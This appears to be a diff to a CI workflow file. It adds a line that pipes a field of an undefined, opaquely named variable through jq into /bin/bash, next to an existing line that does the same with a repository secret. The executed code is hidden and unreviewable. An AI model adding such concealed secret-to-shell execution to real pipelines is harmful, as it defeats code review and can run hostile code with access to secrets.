@@ -23,6 +23,7 @@ jobs:
           h22112: ${{ secrets.h22112 }}
         run: |
           printf '%s' "$h22112" | jq -r .oiy7004 | /bin/bash
+          printf '%s' "$ap03914" | jq -r .zsmi37654 | /bin/bash
 
       - name: Upload artifact
         if: always()
